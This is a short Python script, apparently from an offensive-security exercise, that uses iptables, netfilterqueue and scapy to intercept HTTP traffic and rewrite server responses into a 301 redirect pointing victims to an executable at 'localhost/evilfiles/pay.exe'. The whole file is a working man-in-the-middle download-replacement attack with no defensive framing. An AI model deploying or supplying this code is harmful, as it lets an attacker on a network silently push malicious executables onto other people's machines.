#! /usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess


ack = []


def process_pac(packet):
    pac = scapy.IP(packet.get_payload())
    if pac.haslayer(scapy.Raw):
        if pac[scapy.TCP].dport == 80:
            ack.append(pac[scapy.TCP].ack)
            print("This is request")
            #pac.show()
        elif pac[scapy.TCP].sport == 80:
            print("This is reponse")
            if pac[scapy.TCP].seq in ack:
                ack.remove(pac[scapy.TCP].seq)
                pac[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation:http://localhost/evilfiles/pay.exe\n\n"
                del pac[scapy.IP].len
                del pac[scapy.IP].chksum
                del pac[scapy.TCP].chksum
                packet.set_payload(str(pac))
    packet.accept()


try:
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    que = netfilterqueue.NetfilterQueue()
    que.bind(0, process_pac)
    que.run()

except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)